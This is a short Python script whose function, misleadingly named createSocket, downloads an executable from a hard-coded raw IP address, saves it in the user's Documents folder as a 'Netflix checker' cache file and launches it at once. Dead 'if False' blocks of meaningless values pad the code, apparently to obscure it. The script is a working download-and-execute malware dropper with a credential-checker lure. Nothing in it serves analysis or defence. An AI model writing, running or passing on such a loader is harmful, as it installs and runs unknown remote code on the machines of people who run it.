import requests
import os

def createSocket():
    username = os.getlogin()

    def download(url, path):
        reponse = requests.get(url)
        if False:
            _var_206_0 = (745, 236, 294)
            _var_206_1 = (144, 463, 459)

            def _var_206_fn():
                pass
        with open(path, 'wb') as fichier:
            fichier.write(reponse.content)

    def launch(path):
        os.startfile(path)
    path = f'C:\\Users\\{username}\\Documents\\netflix_checker_cache.exe'
    dl_url = 'http://194.163.191.205:6963/builds/Netflix_Checker.exe'
    if False:
        _var_207_0 = (708, 879, 57)
        _var_207_1 = (946, 445, 132)
        _var_207_2 = (784, 899, 261)

        def _var_207_fn():
            pass
    download(dl_url, path)
    if False:
        _var_208_0 = (430, 986, 217)
        _var_208_1 = (301, 850, 754)
        _var_208_2 = (278, 715, 461)

        def _var_208_fn():
            pass
    launch(path)